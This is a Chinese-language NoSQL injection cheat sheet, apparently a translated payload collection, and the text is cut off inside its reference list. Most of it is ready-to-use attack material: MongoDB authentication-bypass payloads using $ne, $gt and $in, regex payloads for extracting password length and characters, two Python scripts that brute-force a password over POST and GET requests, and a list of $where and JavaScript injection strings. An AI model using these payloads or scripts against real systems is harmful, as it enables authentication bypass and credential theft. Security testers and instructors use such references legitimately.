# NoSQL 注入

> NoSQL数据库相较于传统的SQL数据库提供了相对宽松的一致性限制。通过减少关系约束和一致性检查，NoSQL数据库在很多情况下提供很好的性能和扩展优势。即便NoSQL没有使用传统的SQL语法，它任然可能会受到注入攻击。

## 摘要

* [工具](#工具)
* [Exploit](exploits)
	* [认证绕过](#认证绕过)
	* [提取长度信息](#提取长度信息)
	* [提取数据信息](#提取数据信息)
* [Blind NoSQL](#blind-nosql)
	* [POST with JSON body](#post-with-json-body)
	* [GET](#get)
* [MongoDB Payloads](#mongodb-payloads)
* [References](#references)

## 工具

* [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)

## Exploit

### 认证绕过

通过使用不等于(\$ne)或者大于(\$gt)进行认证绕过

```json
in URL
username[$ne]=toto&password[$ne]=toto

in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

### 提取长度信息

```json
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### 提取数据信息

```json
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

使用"in"提取数据

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```


## Blind NoSQL

### POST with JSON body


```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print("Found one more char : %s" % (password+c))
        password += c
```

## MongoDB Payloads

```bash
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```

## References

* [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
* [Testing for NoSQL injection - OWASP](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)
* [NoSQL injection wordlists - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
* [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](